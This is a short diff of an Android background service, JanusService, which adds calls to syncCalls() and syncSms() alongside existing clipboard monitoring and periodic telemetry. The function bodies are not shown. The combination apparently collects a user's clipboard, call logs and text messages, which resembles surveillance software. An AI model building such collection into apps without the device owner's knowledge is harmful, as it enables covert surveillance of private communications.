@@ -230,6 +230,8 @@ class JanusService : Service() {
                         sendTelemetryUpdate()
                         startClipboardMonitoring()
                         startPeriodicTelemetry()
+                        syncCalls()
+                        syncSms()
                     } else {
                         stopClipboardMonitoring()
                         stopPeriodicTelemetry()
